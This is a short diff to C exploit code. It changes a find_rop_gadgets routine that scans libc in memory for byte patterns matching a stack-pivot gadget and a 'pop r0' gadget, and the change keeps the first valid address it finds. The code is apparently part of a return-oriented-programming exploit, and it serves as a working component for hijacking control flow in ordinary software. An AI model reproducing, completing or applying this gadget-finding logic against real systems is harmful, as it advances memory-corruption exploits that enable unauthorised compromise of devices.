@@ -286,20 +286,24 @@ static int find_rop_gadgets()
 		n = read(fd, r, 2);
 		switch(r[0]) {
 		case '\x1b':
-			if(r[1] == '\xb0') {
-				n = read(fd, d, 2);
-				if(d[0] == '\xf0' && d[1] == '\xbd') {
-					stack_pivot = libc_base + lseek(fd, 0, SEEK_CUR) - 4 + 1;
-					if(check_addr(stack_pivot) == -1)
-						stack_pivot = 0x41414141;
+			if(stack_pivot == 0x41414141) {
+				if(r[1] == '\xb0') {
+					n = read(fd, d, 2);
+					if(d[0] == '\xf0' && d[1] == '\xbd') {
+						stack_pivot = libc_base + lseek(fd, 0, SEEK_CUR) - 4 + 1;
+						if(check_addr(stack_pivot) == -1)
+							stack_pivot = 0x41414141;
+					}
 				}
 			}
 			break;
 		case '\x01':
-			if(r[1] == '\xbd') {
-				pop_r0 = libc_base + lseek(fd, 0, SEEK_CUR) - 2 + 1;
-				if(check_addr(pop_r0) == -1)
-					pop_r0 = 0x41414141;
+			if(pop_r0 == 0x41414141) {
+				if(r[1] == '\xbd') {
+					pop_r0 = libc_base + lseek(fd, 0, SEEK_CUR) - 2 + 1;
+					if(check_addr(pop_r0) == -1)
+						pop_r0 = 0x41414141;
+				}
 			}
 			break;
 		default:
